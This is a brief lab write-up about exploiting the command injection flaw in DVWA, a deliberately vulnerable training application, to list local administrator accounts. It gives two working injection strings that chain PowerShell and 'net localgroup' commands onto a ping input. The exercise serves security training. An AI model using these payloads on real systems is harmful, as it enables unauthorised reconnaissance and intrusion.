---
description: >-
  In the DVWA (Damn Vulnerable Web Application), we will exploit the Command
  Injection vulnerability at different security levels (low, medium, high) to
  find administrator accounts.
---

# Task B1

To list members of the Administrators group on the low and medium level:

```powershell
127.0.0.1 & powershell -command "Get-LocalGroupMember -Group 'Administrators'"
```

For all levels, you can use:

```powershell
| net localgroup Administrators
```
